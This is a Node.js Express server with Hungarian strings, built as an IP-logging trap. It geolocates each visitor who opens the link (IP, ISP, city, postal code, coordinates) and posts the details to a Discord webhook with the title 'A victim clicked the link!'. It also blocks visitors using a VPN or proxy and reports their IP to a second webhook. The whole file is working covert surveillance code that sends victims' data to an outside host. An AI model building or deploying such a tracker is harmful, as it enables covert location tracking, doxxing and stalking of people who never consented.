const express = require('express');
const axios = require('axios');
require('dotenv').config();
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Statikus fájlok (pl. public/style.css, public/script.js)
app.use(express.static(path.join(__dirname, 'public')));

const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
const ipinfoToken = process.env.IPINFO_TOKEN;
const proxyCheckApiKey = process.env.PROXYCHECK_API_KEY;
const allowedIps = process.env.ALLOWED_IPS ? process.env.ALLOWED_IPS.split(',') : [];

app.get('/', async (req, res) => {
    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    if (allowedIps.includes(userIp)) {
        return res.sendFile(path.join(__dirname, 'index.html'));
    }
    try {
        // ProxyCheck
        const proxyCheckResponse = await axios.get(`https://proxycheck.io/v2/${userIp}?key=${proxyCheckApiKey}&vpn=1&proxy=1`);
        const proxyCheckData = proxyCheckResponse.data;
        if (proxyCheckData[userIp].vpn === "yes" || proxyCheckData[userIp].proxy === "yes") {
            // ALT webhook: VPN/Proxy
            const altMessage = {
                username: "VPN/Proxy Észlelő Rendszer",
                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                content: `Figyelem! VPN vagy Proxy használatot észleltünk az IP címen: ${userIp}`,
                embeds: [{
                    title: "VPN/Proxy használat észlelve!",
                    description: `**IP-cím >>** ${userIp}`,
                    color: 0xFF0000
                }]
            };
            await axios.post(altWebhookUrl, altMessage);
            return res.status(403).send("Hozzáférés tilos: VPN vagy Proxy használata nem engedélyezett.");
        }
        res.sendFile(path.join(__dirname, 'index.html'));
    } catch (error) {
        console.error('Hiba:', error.message);
        res.status(500).send('Belső hiba történt a VPN ellenőrzés során.');
    }
});

// Rossz műveletek: ALT webhook-ra
app.get('/send-ip', async (req, res) => {
    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
    const reason = req.query.reason || '';

    if (allowedIps.includes(userIp)) {
        return res.json({ ip: userIp });
    }
    try {
        // VPN/Proxy ellenőrzés, ha kell (opcionális, akár ki is hagyhatod)
        const proxyCheckResponse = await axios.get(`https://proxycheck.io/v2/${userIp}?key=${proxyCheckApiKey}&vpn=1&proxy=1`);
        const proxyCheckData = proxyCheckResponse.data;
        if (proxyCheckData[userIp].vpn === "yes" || proxyCheckData[userIp].proxy === "yes") {
            // ALT webhook: VPN/Proxy
            const altMessage = {
                username: "VPN/Proxy Észlelő Rendszer",
                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                content: `Figyelem! VPN vagy Proxy használatot észleltünk az IP címen: ${userIp}`,
                embeds: [{
                    title: "VPN/Proxy használat észlelve!",
                    description: `**IP-cím >>** ${userIp}`,
                    color: 0xFF0000
                }]
            };
            await axios.post(altWebhookUrl, altMessage);
            return res.status(403).send("Hozzáférés tilos: VPN vagy Proxy használata nem engedélyezett.");
        }

        if (reason && reason !== "Oldal betöltése") {
            // ALT webhook - tiltott művelet!
            const payload = {
                username: "Tiltott Művelet Figyelő",
                avatar_url: "https://i.imgur.com/iZzx789.png",
                content: `Tiltott művelet: **${reason}**\nIP: **${userIp}**`
            };
            await axios.post(altWebhookUrl, payload);
            return res.json({ ip: userIp });
        } else {
            // Normál linkre kattintás = FŐ webhookra megy!
            const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
            const geoData = geoResponse.data;
            const [latitude, longitude] = (geoData.loc || '0,0').split(',');

            const message = {
                username: "Helyszíni Naplózó <3",
                avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
                content: `<@1095731086513930260>`,
                embeds: [{
                    title: "Egy áldozat rákattintott a linkre!",
                    description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.postal || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                    color: 0x800080
                }]
            };
            await axios.post(webhookUrl, message);
            return res.json({ ip: userIp });
        }
    } catch (error) {
        console.error('Hiba:', error.message);
        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
    }
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
